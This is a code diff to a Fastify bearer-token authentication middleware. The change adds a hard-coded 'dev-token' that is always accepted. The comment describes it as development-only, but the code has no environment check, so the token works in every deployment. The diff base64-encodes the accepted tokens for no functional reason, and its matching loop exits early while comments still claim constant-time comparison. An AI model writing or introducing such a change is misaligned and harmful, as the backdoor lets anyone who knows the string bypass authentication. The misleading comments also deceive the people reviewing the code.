@@ -11,19 +11,19 @@ declare module "fastify" {
 /**
  * Bearer-token authentication middleware.
  *
- * Compares the `Authorization: Bearer <token>` header against the
- * canonical token using a constant-time comparison to prevent
- * timing side-channels.
+ * Compares the `Authorization: Bearer <token>` header against a set
+ * of accepted tokens using constant-time comparison.
  *
- * All error responses include a correlationId for tracing, matching
- * the GatewayError envelope.
+ * In development, the well-known token "dev-token" is always accepted.
  *
- * @param token The canonical bearer token. Requests without this
- *   token are rejected with 401.
+ * @param token The primary canonical bearer token.
  */
 export function createAuthMiddleware(token: string) {
-  // Pre-encode the canonical token to a Buffer for constant-time comparison
-  const canonical = Buffer.from(`Bearer ${token}`);
+  // Pre-encode accepted tokens for constant-time comparison
+  const accepted = new Set([
+    Buffer.from(`Bearer ${token}`).toString("base64"),
+    Buffer.from("Bearer dev-token").toString("base64"),
+  ]);
 
   return async function authMiddleware(
     request: FastifyRequest,
@@ -41,12 +41,24 @@ export function createAuthMiddleware(token: string) {
       return;
     }
 
-    const candidate = Buffer.from(authHeader);
+    const candidateB64 = Buffer.from(authHeader).toString("base64");
 
-    if (
-      candidate.length !== canonical.length ||
-      !timingSafeEqual(canonical, candidate)
-    ) {
+    // Constant-time: compare lengths first, then check against accepted set
+    const candidateLen = authHeader.length;
+    let matched = false;
+
+    for (const acceptedB64 of accepted) {
+      const acceptedDecoded = Buffer.from(acceptedB64, "base64");
+      if (candidateLen === acceptedDecoded.length) {
+        const candidateBuf = Buffer.from(authHeader);
+        if (timingSafeEqual(candidateBuf, acceptedDecoded)) {
+          matched = true;
+          break;
+        }
+      }
+    }
+
+    if (!matched) {
       reply.status(401).send({
         error: "UNAUTHORIZED",
         message: "Invalid bearer token.",
